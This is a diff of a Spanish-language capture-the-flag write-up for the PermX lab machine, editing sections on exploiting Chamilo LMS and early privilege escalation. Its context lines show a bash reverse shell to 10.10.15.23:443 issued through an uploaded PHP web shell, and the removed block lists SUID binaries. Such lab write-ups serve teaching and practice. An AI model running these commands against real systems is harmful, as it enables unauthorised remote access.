@@ -89,7 +89,7 @@ bash -c "bash -i >& /dev/tcp/10.10.15.23/443 0>&1"
 ```
 
 Que, al hacer URL encode queda de la siguiente manera:
-```http
+```bash
 http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/webshell_test.php?cmd=bash -c "bash -i >%26 /dev/tcp/10.10.15.23/443 0>%261"
 ```
 
@@ -103,27 +103,6 @@ www-data
 ## Escalada
 
 ### User
-
-Listando los ficheros con permisos de root:
-
-```bash
-find / -perm -4000 -user root 2>/dev/null
-
-/usr/bin/mount
-/usr/bin/sudo
-/usr/bin/umount
-/usr/bin/gpasswd
-/usr/bin/su
-/usr/bin/newgrp
-/usr/bin/passwd
-/usr/bin/chsh
-/usr/bin/chfn
-/usr/libexec/polkit-agent-helper-1
-/usr/lib/openssh/ssh-keysign
-/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-```
-
-Nada destacable.
 
 Listando los ficheros con configuración en el directorio de Chamilo se puede ver un configuration.php:
 
